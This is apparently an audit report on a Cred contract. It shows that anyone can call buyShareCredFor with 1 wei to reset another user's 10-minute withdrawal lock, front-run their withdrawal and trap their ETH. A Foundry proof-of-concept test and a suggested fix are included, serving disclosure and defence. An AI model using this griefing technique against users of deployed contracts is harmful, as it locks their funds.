# Vulnerability details

## Impact
Users can buy share credits for other users via `buyShareCredFor(...)`. However, instant withdrawals are not allowed. A user must wait until a certain time period has passed (`SHARE_LOCK_PERIOD`, which is set to 10 minutes). The problem is that a malicious user can target another user that tries to withdraw their ETH and front-run them by buying credits for them and therefore increasing their locking period by another 10 minutes

The attack costs the attacker essenitally nothing since they need to buy only 1 wei worth of creds for another user. The contracts will also be deployed on a L2, so the gas costs are also minimal.

If a user deposits 10 ETH, the malicious user can buy for them minimum amounts of credit and not allow them to withdraw

## Proof of Concept
Paste this test into the `Cred.t.sol` file:
```
function test_BrickUser() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.startPrank(anyone);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);

        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        vm.warp(block.timestamp + 10 minutes + 1 seconds);

        vm.stopPrank();

        buyPrice = bondingCurve.getBuyPriceAfterFee(1, 2, 1);
        maxPrice = bondingCurve.getBuyPriceAfterFee(1, 2, 2);
        cred.buyShareCredFor{ value: buyPrice }(1, 1, anyone, maxPrice);

        vm.startPrank(anyone);

        uint256 minPrice = bondingCurve.getSellPriceAfterFee(1, 2, 1);
        vm.expectRevert();
        cred.sellShareCred(1, 1, minPrice);

        vm.stopPrank();
    }
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Don't update `lastTradeTimestamp` when calling `buyShareCredFor(...)` or allow only certain users to buy credits on behalf of a user by requiring a signature
